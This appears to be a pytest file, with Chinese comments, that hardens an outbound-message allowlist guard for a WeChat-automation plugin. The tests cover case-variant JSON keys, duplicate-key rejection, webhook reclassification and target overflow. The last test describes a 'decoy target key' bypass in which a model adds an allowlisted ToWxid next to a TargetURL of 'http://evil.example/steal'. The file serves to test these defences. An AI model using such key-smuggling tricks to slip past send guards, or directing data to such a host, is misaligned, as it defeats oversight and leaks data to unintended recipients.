"""出站闸的目标提取：**键名归一化** + 同键多值拒绝（2026-10-18 修）。

## 修的是什么

闸原先按**固定拼写名单**取目标（``ToWxid`` / ``toWxid`` / ``to_wxid`` …）。而厂商是
Go + swagger：``encoding/json`` 对结构体字段**大小写不敏感**，``{"ToWxid": "ok",
"ToWXID": "PROD"}`` 实际只会发给 PROD。拼写名单只认得出前者 ⇒ 闸核对了测试群、
真消息进了生产群（微信撤不回）。

现在：① 键名归一化（lower + 去下划线）后匹配；② 归一化后同一键出现多个变体 ⇒
直接拒绝（说不清发给谁的一律不放行）。

另外 ``/Webhook/Test`` 从"只读"改判为"写"：它的语义是把任意 ``TestData`` POST 到
已配置的回调，是网络写动作，原先因为词表里有 ``Test`` 被当成读端点绕过了闸。
"""

from __future__ import annotations

import asyncio
import types

import pytest

from plugin.core import outbound_guard as og
from plugin.core import netguard


@pytest.fixture()
def allowlist(monkeypatch):
    monkeypatch.setenv(netguard.SEND_ALLOWLIST_ENV, "ok@chatroom")
    yield
    monkeypatch.delenv(netguard.SEND_ALLOWLIST_ENV, raising=False)


def test_case_variant_keys_are_both_collected() -> None:
    got = og.targets_in({"ToWxid": "ok@chatroom", "ToWXID": "PROD@chatroom"})
    assert set(got) == {"ok@chatroom", "PROD@chatroom"}


def test_underscore_and_case_variants_are_equivalent() -> None:
    assert og.duplicated_target_keys({"ToWxid": "a", "to_wxid": "b"}) == ("towxid",)
    assert og.duplicated_target_keys({"ToWxid": "a"}) == ()


def test_variants_in_separate_list_items_are_not_duplicates() -> None:
    """★ 跨对象不算同键多值（2026-10-18 修）：列表元素各用自己的拼写是合法载荷。

    每个 dict 内部只有一个有效键、两个目标都过白名单 ⇒ 不存在"核对了 A、发给了 B"。
    按整棵子树计数会把 ``Items`` 这类正常批量请求误拒。
    """
    body = {"Items": [{"ToWxid": "a@chatroom"}, {"to_wxid": "b@chatroom"}]}
    assert og.duplicated_target_keys(body) == ()
    assert set(og.targets_in(body)) == {"a@chatroom", "b@chatroom"}


def test_variants_inside_one_list_item_are_still_duplicates() -> None:
    body = {"Items": [{"ToWxid": "a@chatroom", "ToWXID": "b@chatroom"}]}
    assert og.duplicated_target_keys(body) == ("towxid",)


def test_guard_rejects_ambiguous_duplicate_keys(allowlist) -> None:
    with pytest.raises(netguard.GuardError):
        og.guard("/Msg/SendTxt", {"ToWxid": "ok@chatroom", "ToWXID": "PROD@chatroom"})


def test_guard_still_allows_the_allowlisted_target(allowlist) -> None:
    og.guard("/Msg/SendTxt", {"ToWxid": "ok@chatroom"})  # 不抛


def test_guard_blocks_non_allowlisted_target(allowlist) -> None:
    with pytest.raises(netguard.GuardError):
        og.guard("/Msg/SendTxt", {"ToWxid": "someone-else@chatroom"})


def test_webhook_test_is_no_longer_read_only(allowlist) -> None:
    assert og.is_read_only("/Webhook/Test") is False
    with pytest.raises(netguard.GuardError):
        og.guard("/Webhook/Test", {"MessageType": 1, "TestData": {"msg": "hi"}})


def test_read_only_endpoints_still_pass(allowlist) -> None:
    assert og.is_read_only("/Login/HeartBeat") is True
    og.guard("/Login/HeartBeat", {})  # 不抛


# ---------------------------------------------------------------- 2026-10-19 加固


def test_path_targets_are_checked(allowlist) -> None:
    """路径参数移到 URL 后仍是收件人，必须过白名单。"""
    endpoint = "/XiaoWei/Chat/Sessions/{session_id}/Messages"
    og.guard(endpoint, {}, "acct", path_targets=("ok@chatroom",))
    with pytest.raises(netguard.GuardError):
        og.guard(endpoint, {}, "acct", path_targets=("prod@chatroom",))


def test_missing_target_keys_are_checked(allowlist) -> None:
    """群主转让/视频号私信的真正接收方原先不在 TARGET_KEYS ⇒ 白名单只看了群 ID。"""
    with pytest.raises(netguard.GuardError):
        og.guard("/Group/SendTransferGroupOwner",
                 {"QID": "ok@chatroom", "NewOwnerUserName": "wxid_victim"}, "acct")
    with pytest.raises(netguard.GuardError):
        og.guard("/Finder/FinderSendText",
                 {"FinderUsername": "victim_finder", "Text": "hi"}, "acct")


def test_target_overflow_fails_closed(allowlist) -> None:
    """超过硬上限不能静默截断后放行（第 65 个目标会完全逃过核对）。"""
    with pytest.raises(netguard.GuardError) as caught:
        og.guard("/Msg/SendTxt", {"ToWxids": [f"u{i}" for i in range(65)]}, "acct")
    assert "上限" in str(caught.value)


def test_captured_allowlist_does_not_reread_ambient_env(allowlist) -> None:
    """发送任务掉出 profile scope 后，必须继续用连接期捕获的那份白名单。"""
    netguard.check_outbound_allowed("ok@chatroom", allowed=("ok@chatroom",))
    with pytest.raises(netguard.GuardError):
        netguard.check_outbound_allowed("prod@chatroom", allowed=("ok@chatroom",))
    # 空 tuple = 白名单被显式关闭（不是「回落到 env」）
    netguard.check_outbound_allowed("prod@chatroom", allowed=())


def test_schema_filter_drops_decoy_target_keys() -> None:
    """模型给工具塞 schema 外参数时，不得原样进请求体。

    这是「诱饵目标键」绕过收口：``/Msg/StartAutoSync`` 的 schema 只有 TargetURL，
    模型另塞一个白名单内的 ``ToWxid``，闸会只看到诱饵、放行真正的 TargetURL。
    通用 handler 现在只保留 schema 声明的键。
    """
    from plugin.toolkit import registry

    class _Client:
        def __init__(self) -> None:
            self.calls: list[tuple[str, dict]] = []

        async def call(self, endpoint: str, body: dict, method: str = "POST"):
            self.calls.append((endpoint, body))
            return {"Code": 0, "Data": {}}

    class _Ctx:
        def __init__(self) -> None:
            self.tools: dict[str, dict] = {}

        def register_tool(self, **kwargs) -> None:
            self.tools[kwargs["name"]] = kwargs

    client = _Client()
    adapter = types.SimpleNamespace(_clients={"acct": client})
    ctx = _Ctx()
    registry.register_generic_tools(ctx, lambda: adapter, [{
        "name": "wpp_start_auto_sync",
        "endpoint": "/Msg/StartAutoSync",
        "description": "d",
        "params": {"TargetURL": {"type": "string"}},
    }])
    asyncio.run(ctx.tools["wpp_start_auto_sync"]["handler"](
        account_id="acct",
        TargetURL="http://evil.example/steal",
        ToWxid="ok@chatroom",
    ))
    assert client.calls == [("/Msg/StartAutoSync",
                             {"TargetURL": "http://evil.example/steal"})]
